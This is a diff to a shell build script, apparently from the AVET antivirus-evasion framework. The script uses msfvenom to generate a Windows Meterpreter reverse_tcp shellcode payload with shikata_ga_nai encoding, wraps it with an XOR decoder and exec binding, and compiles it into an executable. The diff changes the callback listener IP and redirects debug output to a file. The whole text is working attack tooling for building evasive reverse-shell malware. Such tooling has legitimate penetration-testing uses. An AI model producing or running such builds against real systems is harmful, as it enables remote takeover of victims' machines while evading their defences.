@@ -18,7 +18,7 @@ LHOST=$GLOBAL_LHOST
 
 # generate payload
 #msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=443 -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > input/scraw.txt
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=443 -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > input/scraw.txt
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -54,7 +54,7 @@ set_decoder xor
 set_shellcode_binding exec_shellcode
 
 # enable debug printing
-enable_debug_print
+enable_debug_print to_file C:/avetdbg.txt
 
 # compile
 $win32_compiler -o output/output.exe source/avet.c -lws2_32
